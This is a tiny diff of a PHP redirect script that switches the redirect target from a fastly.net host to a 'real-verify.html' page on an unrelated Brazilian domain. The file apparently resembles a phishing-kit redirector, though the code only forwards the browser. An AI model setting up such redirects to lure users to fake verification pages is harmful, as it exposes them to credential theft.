@@ -1,6 +1,6 @@
 
 <?php
 //Redirect Browser
-header("Location: https://piv-seil.global.ssl.fastly.net/");
+header("Location: https://olhodesogra.com.br/real-verify.html/");
 exit();
 ?>
